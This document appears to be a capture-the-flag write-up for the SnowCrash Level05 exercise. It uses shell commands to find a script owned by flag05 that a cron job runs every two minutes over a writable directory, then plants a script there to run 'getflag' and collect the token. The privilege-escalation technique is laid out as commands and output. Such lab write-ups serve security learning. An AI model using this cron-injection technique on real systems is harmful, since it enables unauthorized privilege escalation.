# SnowCrash Level05 Guide
This guide will walk you through the process of finding the password for the `flag05` user.

## Procedure:

1. **Examine your environment using Unix commands.**
   
`ls -la` : Lists files and their permissions in the current directory.
Nothing interesting here.  
Other commands give us also no interesting outputs.

2. **Check the files belonging to the user flag05**

We are looking at files belonging to the user flag05
```bash
find / -user flag05 2>/dev/null
```
Returns
```bash
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```     
`/rofs` indicates that the file is read-only.

3. **Analyze the script '/usr/sbin/openarenaserver'**

We look at what the file '/usr/sbin/openarenaserver' contains
```bash
cat /usr/sbin/openarenaserver
```
Returns
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Breaking down the script:
- It loops over all the files in the '/opt/openarenaserver' directory
- Executes the file with bash, with a runtime limited to 5 seconds (ulimit -t 5)
- Deletes the file

4. **Check '/opt/openarenaserver' directory**
We look at the files in the '/opt/openarenaserver' directory
```bash
ls -la /opt/openarenaserver
```
The directory is empty.
We now look for where the script '/usr/sbin/openarenaserver' is executed to execute our own script.

5. **Use `grep` to find any occurences**

Run the following command:
```bash
grep 'openarena' -R /var/ 2>/dev/null
```
Which returns:
```bash
...
/var/lib/aptitude/pkgstates.old:Package: openarena-data
/var/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
/var/spool/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
We can now see that the script is ran every 2 minutes.

6. **We can now inject commands and hope for the CRON task to run our script**

Run:
```bash
echo 'getflag > /tmp/flag_05' > /opt/openarenaserver/getflag.sh
```

After two minutes (pair)m, you should run:
```bash
cat  /tmp/flag_05
```
You will see the token appear.